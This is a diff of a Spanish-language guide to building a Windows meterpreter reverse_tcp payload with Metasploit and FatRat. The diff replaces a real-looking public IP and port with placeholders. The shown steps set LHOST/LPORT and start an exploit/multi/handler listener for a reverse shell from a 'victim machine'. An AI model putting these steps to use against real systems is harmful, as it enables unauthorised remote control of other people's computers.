@@ -42,8 +42,8 @@ Este documento proporciona una guía detallada sobre cómo usar Metasploit y Fat
    - Para Windows, selecciona la opción correspondiente.
 
 3. **Configura el Payload**:
-   - **LHOST**: La IP pública de tu máquina Kali Linux (20.51.215.235).
-   - **LPORT**: Puerto a usar (6666).
+   - **LHOST**: La IP pública de tu máquina Kali Linux ([TU IP] EJEMPLO: 0.0.0.0).
+   - **LPORT**: Puerto a usar (Ejemplo : 555).
    - **Tipo de Payload**: Elige `windows/meterpreter/reverse_tcp`.
 
 4. **Genera el Payload**:
@@ -58,8 +58,8 @@ Este documento proporciona una guía detallada sobre cómo usar Metasploit y Fat
 2. **Configura el Handler en Metasploit**:
    - Utiliza el módulo `exploit/multi/handler`.
    - Configura el payload para `windows/meterpreter/reverse_tcp`.
-   - Establece `LHOST` a la IP pública de la máquina Kali (20.51.215.235).
-   - Establece `LPORT` al puerto en el que Metasploit escuchará las conexiones entrantes (6666).
+   - Establece `LHOST` a la IP pública de la máquina Kali (0.0.0.0).
+   - Establece `LPORT` al puerto en el que Metasploit escuchará las conexiones entrantes (555).
    - Inicia el handler con el comando `exploit`.
 
 ## Ejecución del Payload en la Máquina Víctima
